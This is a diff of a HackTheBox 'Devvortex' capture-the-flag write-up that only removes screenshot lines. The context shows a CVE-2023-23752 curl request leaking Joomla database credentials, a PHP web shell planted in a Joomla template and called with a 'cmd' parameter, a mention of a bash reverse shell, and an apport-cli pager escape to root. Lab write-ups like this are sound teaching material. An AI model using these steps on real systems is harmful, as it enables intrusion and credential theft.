@@ -35,8 +35,6 @@ PORT   STATE SERVICE VERSION
 
 Add `devvortex.htb` to `/etc/hosts`.
 
-![Nmap scan of the target](../images/devvortex-01-nmap.png)
-
 ### Virtual host discovery
 
 The main site is a static brochure. Fuzz for sub-domains:
@@ -64,8 +62,6 @@ curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=tru
 The response discloses `user`, `password`, `db`, and host for the Joomla database — the
 password belongs to the Joomla admin user `lewis`.
 
-![CVE-2023-23752 leaking Joomla DB credentials](../images/devvortex-02-cve-2023-23752.png)
-
 ### Admin panel → template RCE
 
 Log in to `http://dev.devvortex.htb/administrator` as **lewis**. Navigate to
@@ -82,8 +78,6 @@ Save, then trigger it and launch a reverse shell:
 curl "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id"
 # bash reverse shell to your listener
 ```
-
-![Editing the Cassiopeia template to plant a PHP web shell](../images/devvortex-03-template-rce.png)
 
 Shell lands as **www-data**.
 
@@ -129,8 +123,6 @@ sudo /usr/bin/apport-cli -c <crash-file>    # or -f to file a bug / view a repor
 # at the less pager prompt:
 !/bin/bash
 ```
-
-![apport-cli pager escape (CVE-2023-1326) to a root shell](../images/devvortex-04-apport-root.png)
 
 ```
 root@devvortex:~# id
